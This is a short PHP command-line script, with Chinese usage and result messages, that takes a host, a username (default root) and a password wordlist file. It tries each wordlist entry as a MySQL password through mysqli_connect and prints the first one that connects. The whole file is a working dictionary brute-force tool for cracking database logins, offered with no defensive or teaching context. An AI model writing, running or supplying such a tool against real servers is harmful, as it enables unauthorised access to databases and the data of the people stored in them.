<?php

function test()
{
    echo "\n";
    echo "使用方法：-h 127.0.0.1(默认127.0.0.1)  -u root(默认root)  -r password.txt";
    echo "\n";
    echo "\n";
    $param = getopt('h:u:r:');
    if (!file_exists($param['r'])) return '找不到到指定的字典位置！error:' . $param['r'];
    $file = fopen($param['r'], 'r');
    $u = $param['u'] ? $param['u'] : 'root';
    $h = $param['h'] ? $param['h'] : '127.0.0.1';
    while (!feof($file)) {
        $s = str_replace(["\r\n", "\r", "\n"], "", mb_convert_encoding(fgets($file), "UTF-8", "GBK,ASCII,ANSI,UTF-8"));
        $res = @mysqli_connect($h, $u, $s);
        if ($res) {
            return '用户名：' . $u . ' 密码：' . $s;
        }
    }
    fclose($file);
    return '用户【' . $u . '】没有找到密码';
}
echo test();
